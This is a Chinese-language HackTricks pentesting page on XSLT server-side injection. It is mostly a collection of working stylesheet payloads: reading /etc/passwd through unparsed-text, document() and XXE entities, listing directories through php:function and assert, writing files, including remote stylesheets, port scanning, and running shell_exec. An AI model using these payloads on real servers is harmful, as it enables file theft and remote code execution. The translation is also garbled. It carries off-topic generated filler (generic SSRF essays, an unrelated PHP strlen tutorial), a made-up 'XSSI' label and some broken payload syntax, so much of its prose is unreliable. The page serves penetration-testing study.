# XSLT服务器端注入（可扩展样式表语言转换）

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

它用于将XML文档转换为其他类型。版本：1、2和3（1是最常用的）。
转换可以在服务器端或浏览器中进行。

最常用的框架是：**Libxslt**（Gnome）、**Xalan**（Apache）和**Saxon**（Saxonica）。

为了利用这种类型的漏洞，您需要能够在服务器端存储xsl标签，然后访问该内容。可以在[https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)找到此类漏洞的示例。

## 示例 - 教程
```bash
sudo apt-get install default-jdk
sudo apt-get install libsaxonb-java libsaxon-java
```
{% code title="xml.xml" %}
```markup
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
<cd>
<title>CD Title</title>
<artist>The artist</artist>
<company>Da Company</company>
<price>10000</price>
<year>1760</year>
</cd>
</catalog>
```
{% code title="xsl.xsl" %}
```markup
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td><xsl:value-of select="catalog/cd/title"/></td>
<td><xsl:value-of select="catalog/cd/artist"/></td>
</tr>
</table>
</body>
</html>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

执行：
```markup
$ saxonb-xslt -xsl:xsl.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of xsl.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td>CD Title</td>
<td>The artist</td>
</tr>
</table>
</body>
</html>
```
### 指纹识别

{% code title="detection.xsl" %}
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

并执行
```markup
$saxonb-xslt -xsl:detection.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```
### 读取本地文件

{% code title="read.xsl" %}
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}
```markup
$ saxonb-xslt -xsl:read.xsl xml.xml

Warning: at xsl:stylesheet on line 1 column 111 of read.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
```
### SSRF

Server-Side Request Forgery (SSRF)（服务器端请求伪造）是一种攻击技术，攻击者可以利用该技术从受攻击的服务器上发起请求，以访问或攻击内部资源。SSRF攻击通常利用应用程序中存在的漏洞，使攻击者能够控制请求的目标URL，并在服务器上执行任意请求。

攻击者可以利用SSRF攻击来执行以下操作：

- 探测和扫描内部网络
- 访问和读取敏感数据
- 攻击内部系统和服务
- 绕过防火墙和访问控制列表（ACL）

为了成功利用SSRF攻击，攻击者需要找到一个存在漏洞的应用程序，该应用程序允许用户控制请求的目标URL。攻击者可以通过以下方式利用SSRF漏洞：

- 使用URL参数或表单字段来控制请求的目标URL
- 使用文件上传功能来控制请求的目标URL
- 使用XML外部实体（XXE）攻击来控制请求的目标URL

为了防止SSRF攻击，开发人员应该采取以下措施：

- 对用户输入进行严格的验证和过滤，以防止恶意URL的注入
- 使用白名单来限制应用程序可以访问的URL
- 配置防火墙和访问控制列表（ACL）以限制服务器对内部资源的访问
- 更新和修补应用程序中的漏洞，以防止攻击者利用SSRF漏洞

总之，SSRF攻击是一种危险的攻击技术，可以让攻击者利用应用程序中的漏洞来访问和攻击内部资源。开发人员和系统管理员应该采取适当的措施来防止和检测SSRF攻击。
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```
### 版本

根据使用的XSLT版本，可能会有更多或更少的功能：

* [https://www.w3.org/TR/xslt-10/](https://www.w3.org/TR/xslt-10/)
* [https://www.w3.org/TR/xslt20/](https://www.w3.org/TR/xslt20/)
* [https://www.w3.org/TR/xslt-30/](https://www.w3.org/TR/xslt-30/)

## 指纹

上传此文件并获取信息
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
## SSRF

SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种攻击技术，攻击者可以利用该技术从受攻击的服务器上发起请求，访问该服务器通常无法访问的资源。SSRF攻击通常利用应用程序对用户输入的不正确处理，从而使攻击者能够控制请求的目标和内容。

攻击者可以利用SSRF攻击来执行以下操作：

- 探测内部网络：攻击者可以通过发送请求到内部网络的资源来探测目标系统的拓扑结构和服务。
- 绕过防火墙和访问控制：攻击者可以通过SSRF攻击绕过防火墙和其他访问控制机制，直接访问内部系统和服务。
- 攻击内部资源：攻击者可以利用SSRF攻击来攻击内部资源，如数据库、文件系统等。
- 利用云服务：如果目标系统在云服务上运行，攻击者可以利用SSRF攻击来访问云服务的元数据和其他敏感信息。

为了防止SSRF攻击，开发人员应该采取以下措施：

- 输入验证和过滤：对用户输入进行严格的验证和过滤，确保只允许有效的URL和IP地址。
- 白名单：限制应用程序可以访问的资源，只允许访问受信任的URL和IP地址。
- 隔离网络：将应用程序和内部网络隔离开来，限制应用程序只能访问必要的资源。
- 安全配置：确保服务器和应用程序的安全配置，包括限制出站连接和禁用不必要的服务。

通过采取这些措施，可以有效减少SSRF攻击的风险，并保护应用程序和系统的安全。
```markup
<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
</esi:include>
```
## JavaScript注入

JavaScript注入是一种常见的Web应用程序漏洞，攻击者可以通过注入恶意的JavaScript代码来执行未经授权的操作。这种漏洞通常出现在用户输入未经充分验证的地方，例如表单字段、URL参数或Cookie。

攻击者可以利用JavaScript注入来执行各种恶意操作，包括窃取用户的敏感信息、篡改网页内容、劫持用户会话等。为了防止JavaScript注入攻击，开发人员应该始终对用户输入进行严格的验证和过滤，并使用安全的编码实践来防止脚本注入。

以下是一些常见的JavaScript注入攻击技术：

- **XSS（跨站脚本）攻击**：攻击者通过注入恶意的JavaScript代码来窃取用户的敏感信息或执行其他恶意操作。开发人员应该使用适当的输入验证和输出编码来防止XSS攻击。

- **DOM（文档对象模型）注入**：攻击者通过修改网页的DOM结构来执行恶意操作。开发人员应该使用安全的DOM操作方法，并避免直接使用用户输入来修改DOM。

- **JSONP（JSON with Padding）注入**：攻击者通过注入恶意的JSONP回调函数来执行恶意操作。开发人员应该使用安全的JSONP实现，并对回调函数进行验证和过滤。

- **HTML注入**：攻击者通过注入恶意的HTML代码来篡改网页内容或执行其他恶意操作。开发人员应该使用适当的输出编码来防止HTML注入攻击。

- **AJAX注入**：攻击者通过注入恶意的AJAX请求来执行未经授权的操作。开发人员应该对AJAX请求进行严格的验证和过滤，并使用安全的AJAX实现来防止注入攻击。

通过了解这些JavaScript注入攻击技术，开发人员可以采取适当的防御措施来保护Web应用程序免受恶意攻击的影响。
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>
```
## 目录列表（PHP）

### **Opendir + readdir**
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
</xsl:template></xsl:stylesheet>
```
### **断言（var\_dump + scandir + false）**

在进行服务器端注入时，我们可以使用XSLT（可扩展样式表语言转换）来执行一些有趣的操作。其中一种技术是使用`var_dump`和`scandir`函数来获取服务器上的文件和目录列表。

以下是一个示例XSLT代码，用于执行此操作：

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
    <xsl:output method="text" omit-xml-declaration="yes" />
    <xsl:template match="/">
        <xsl:variable name="dir" select="php:function('scandir', '.')"/>
        <xsl:for-each select="$dir">
            <xsl:value-of select="php:function('var_dump', .)"/>
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>
```

这段代码将使用`scandir`函数获取当前目录中的文件和目录列表，并使用`var_dump`函数将结果输出到页面上。

要执行此代码，我们需要将其作为参数传递给服务器上的XSLT处理器。这可以通过发送HTTP请求来完成，其中包含对XSLT文件的引用。

请注意，这种技术可能会导致服务器上的敏感信息泄漏，因此在进行任何测试之前，请确保已获得适当的授权。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
<br />
</body>
</html>
```
### **内部 - PHP**

XSLT（可扩展样式表语言转换）是一种用于将XML文档转换为其他格式的技术。在某些情况下，XSLT可以用于读取服务器上的文件，包括敏感文件。

要利用XSLT进行服务器端注入，首先需要找到一个可以接受用户提供的XSLT样式表的应用程序。然后，可以使用以下技术之一来读取文件：

1. **document()函数**：XSLT中的document()函数允许读取其他XML文档。通过构造一个包含敏感文件路径的XSLT样式表，并在其中使用document()函数，可以读取服务器上的文件。

2. **xsl:include和xsl:import**：XSLT中的xsl:include和xsl:import指令允许引用其他XSLT样式表。通过构造一个包含敏感文件路径的XSLT样式表，并在其中使用xsl:include或xsl:import指令，可以读取服务器上的文件。

以下是一个示例，演示了如何使用XSLT进行服务器端注入来读取敏感文件：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="file" select="document('/etc/passwd')" />
    <xsl:value-of select="$file" />
  </xsl:template>
</xsl:stylesheet>
```

在上面的示例中，XSLT样式表使用document()函数读取了服务器上的`/etc/passwd`文件，并将其值输出到结果中。

要成功利用XSLT服务器端注入，需要找到一个接受用户提供的XSLT样式表的应用程序，并且该应用程序必须对用户提供的样式表进行解析和执行。
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', ‘utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
### **内部 - XXE**

XXE（外部实体注入）是一种攻击技术，利用了XML解析器的漏洞，允许攻击者读取服务器上的文件、执行远程请求和进行其他恶意操作。在内部渗透测试中，XXE可以用于获取敏感信息、发起攻击或进一步扩大攻击面。

#### **攻击方法**

1. **基于DTD的XXE攻击**：攻击者通过在XML文档中插入恶意的DTD（文档类型定义）来触发XXE漏洞。这可以导致解析器加载外部实体，从而泄露敏感信息。

2. **基于实体的XXE攻击**：攻击者通过在XML文档中插入恶意的实体引用来触发XXE漏洞。这可以导致解析器解析实体并执行恶意操作。

3. **基于参数实体的XXE攻击**：攻击者通过在XML文档中插入恶意的参数实体引用来触发XXE漏洞。这可以导致解析器解析参数实体并执行恶意操作。

#### **防御措施**

为了防止XXE攻击，可以采取以下措施：

1. **禁用外部实体解析**：在XML解析器中禁用外部实体解析，以防止攻击者利用XXE漏洞。

2. **输入验证和过滤**：对用户输入的XML数据进行严格的验证和过滤，以防止恶意XML数据的注入。

3. **使用安全的XML解析器**：使用安全性较高的XML解析器，以减少XXE漏洞的风险。

4. **最小化XML解析器的权限**：将XML解析器的权限限制为最小，以减少攻击者利用XXE漏洞进行恶意操作的可能性。

5. **更新和修补漏洞**：及时更新和修补XML解析器中的漏洞，以确保系统的安全性。

#### **总结**

XXE是一种利用XML解析器漏洞的攻击技术，可以导致敏感信息泄露和恶意操作。为了防止XXE攻击，应禁用外部实体解析、进行输入验证和过滤，使用安全的XML解析器，最小化解析器的权限，并及时更新和修补漏洞。
```markup
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```
### **通过HTTP**

When performing XSLT Server-Side Injection (XSSI) attacks, one common method is to exploit the XSLT processor by sending a specially crafted XML payload through an HTTP request. This allows an attacker to inject malicious code into the server-side XSLT stylesheet, which is then executed by the server.

在执行XSLT服务器端注入（XSSI）攻击时，一种常见的方法是通过HTTP请求发送一个特制的XML负载来利用XSLT处理器。这使得攻击者能够将恶意代码注入到服务器端的XSLT样式表中，然后由服务器执行。

To perform this attack, the attacker needs to identify the vulnerable parameter that is being used in the XSLT transformation. Once the parameter is identified, the attacker can manipulate the XML payload to inject their own XSLT code.

要执行此攻击，攻击者需要识别正在使用XSLT转换的易受攻击参数。一旦参数被识别出来，攻击者可以操纵XML负载以注入自己的XSLT代码。

The XML payload should contain the XSLT code within the `<xsl:stylesheet>` tags. The attacker can then use various XSLT functions and techniques to execute arbitrary commands on the server, read sensitive files, or perform other malicious actions.

XML负载应该在`<xsl:stylesheet>`标签中包含XSLT代码。然后，攻击者可以使用各种XSLT函数和技术在服务器上执行任意命令，读取敏感文件或执行其他恶意操作。

It is important to note that XSSI attacks can only be performed if the server-side XSLT processing is enabled and the XML input is not properly validated or sanitized. Therefore, it is crucial for developers to implement proper input validation and sanitization techniques to prevent such attacks.

需要注意的是，只有在启用了服务器端XSLT处理并且XML输入未经适当验证或清理时，才能执行XSSI攻击。因此，开发人员必须实施适当的输入验证和清理技术，以防止此类攻击。
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

```markup
<!DOCTYPE xsl:stylesheet [
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<xsl:template match="/">
&passwd;
</xsl:template>
```
### **内部（PHP函数）**

The `internal` function in PHP is used to execute internal functions within the PHP interpreter. These functions are built-in and are part of the PHP core. They provide various functionalities that can be used in PHP scripts.

To use an internal function, you simply call it by its name followed by parentheses. You can also pass arguments to the function within the parentheses if required.

Here is an example of using the `strlen()` function, which returns the length of a string:

```php
$string = "Hello, world!";
$length = strlen($string);
echo "The length of the string is: " . $length;
```

In this example, the `strlen()` function is used to calculate the length of the `$string` variable and store it in the `$length` variable. The result is then echoed to the screen.

Internal functions are a powerful feature of PHP that allow you to perform various operations easily. It is important to familiarize yourself with the available internal functions and their usage to make the most out of PHP programming.
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
</xsl:template>
</xsl:stylesheet>
```

```markup
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')" />
<br />
</body>
</html>
```
### 端口扫描

A port scan is a technique used to identify open ports on a target system. It involves sending network requests to different ports and analyzing the responses to determine if the port is open, closed, or filtered. Port scanning is commonly used in penetration testing to identify potential entry points for attackers. By identifying open ports, an attacker can gain information about the services running on the target system and potentially exploit vulnerabilities.
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="document('http://example.com:22')"/>
</xsl:template>
</xsl:stylesheet>
```
## 写入文件

### XSLT 2.0

XSLT 2.0提供了一种将结果写入文件的方法。可以使用`xsl:result-document`元素来实现这一功能。该元素可以指定要写入的文件路径，并将结果写入该文件。

以下是一个示例，演示如何使用XSLT 2.0将结果写入文件：

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:result-document href="output.txt">
      <xsl:text>Hello, World!</xsl:text>
    </xsl:result-document>
  </xsl:template>
</xsl:stylesheet>
```

在上面的示例中，`xsl:result-document`元素的`href`属性指定了要写入的文件路径。在这种情况下，结果将被写入名为`output.txt`的文件中。

要执行上述XSLT转换并将结果写入文件，可以使用支持XSLT 2.0的XSLT处理器。
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>
</xsl:template>
</xsl:stylesheet>
```
### **Xalan-J扩展**

Xalan-J是一个Java编写的XSLT处理器，它支持XSLT 1.0和XSLT 2.0标准。Xalan-J提供了一些扩展功能，可以在XSLT转换过程中执行Java代码。这些扩展功能可以用于执行各种任务，包括文件操作、网络请求和系统命令执行等。

在进行XSLT服务器端注入时，可以利用Xalan-J扩展来执行任意的Java代码。通过构造恶意的XSLT样式表，攻击者可以注入并执行任意的Java代码，从而实现服务器端的远程命令执行。

要利用Xalan-J扩展进行服务器端注入，需要满足以下条件：

- 目标应用程序使用Xalan-J作为其XSLT处理器。
- 目标应用程序允许用户提供自定义的XSLT样式表。

如果以上条件满足，攻击者可以构造恶意的XSLT样式表，其中包含Xalan-J扩展的调用。当目标应用程序将用户提供的样式表用于XSLT转换时，恶意代码将被执行，从而导致服务器端的远程命令执行。

为了防止Xalan-J扩展的滥用，应用程序开发人员应该遵循以下安全最佳实践：

- 不要允许用户提供自定义的XSLT样式表，或者对用户提供的样式表进行严格的输入验证和过滤。
- 使用最新版本的Xalan-J，并及时应用安全补丁。
- 限制Xalan-J扩展的使用权限，只允许受信任的用户或角色使用。

通过了解Xalan-J扩展的工作原理和防御措施，可以有效地保护应用程序免受XSLT服务器端注入攻击的威胁。
```markup
<xsl:template match="/">
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt"/> Write Local File</redirect:write>
<redirect:close file="loxal_file.txt"/>
</xsl:template>
```
其他在PDF中编写文件的方法

## 包含外部XSL文件
```markup
<xsl:include href="http://extenal.web/external.xsl"/>
```

```markup
<?xml version="1.0" ?>
<?xml-stylesheet type="text/xsl" href="http://external.web/ext.xsl"?>
```
## 执行代码

### **php:function**
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','sleep 10')" />
</xsl:template>
</xsl:stylesheet>
```

```markup
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />
<br />
</body>
</html>
```
在PDF中使用其他框架执行代码

### **更多语言**

**在此页面中，您可以找到其他语言中的RCE示例：** [**https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET**](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET) **(C＃，Java，PHP)**

## **从类中访问PHP静态函数**

以下函数将调用类XSL的静态方法`stringToUrl`：
```markup
<!--- More complex test to call php class function-->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<xsl:output method="html" version="XHTML 1.0" encoding="UTF-8" indent="yes" />
<xsl:template match="root">
<html>
<!-- We use the php suffix to call the static class function stringToUrl() -->
<xsl:value-of select="php:function('XSL::stringToUrl','une_superstring-àÔ|modifier')" />
<!-- Output: 'une_superstring ao modifier' -->
</html>
</xsl:template>
</xsl:stylesheet>
```
## **暴力破解检测列表**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt" %}

## **参考资料**

* [XSLT\_SSRF](https://feelsec.info/wp-content/uploads/2018/11/XSLT\_SSRF.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
